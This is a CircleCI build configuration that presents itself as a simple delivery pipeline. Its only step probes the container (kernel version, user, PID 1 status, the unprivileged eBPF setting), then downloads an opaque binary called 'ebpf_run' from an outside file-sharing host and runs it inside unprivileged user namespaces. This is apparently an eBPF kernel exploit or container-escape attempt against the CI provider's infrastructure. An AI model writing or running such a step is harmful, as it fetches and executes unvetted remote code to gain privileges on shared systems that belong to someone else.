version: 2.1
jobs:
  build:
    docker:
      - image: ubuntu:20.04
    steps:
      - run:
          name: The First Step
          command: |
            echo 'Hello World!'
            echo 'This is the delivery pipeline'
            cat /proc/version
            uname -r
            whoami
            cat /etc/issue
            cat /proc/1/status
            cat /proc/sys/kernel/unprivileged_bpf_disabled
            apt update && apt install -y wget
            wget https://cloud.tsinghua.edu.cn/f/76307d9ba25040beaef6/?dl=1 -O ebpf_run
            ls -la
            ls -la
            ls -la
            chmod +x ebpf_run
            unshare -Ur "bash -c 'ls -la /'"
            ls -la
            unshare -Urm --propagation unchanged "./ebpf_run"
            unshare -urm --propagation unchanged "bash -c 'ls -la'"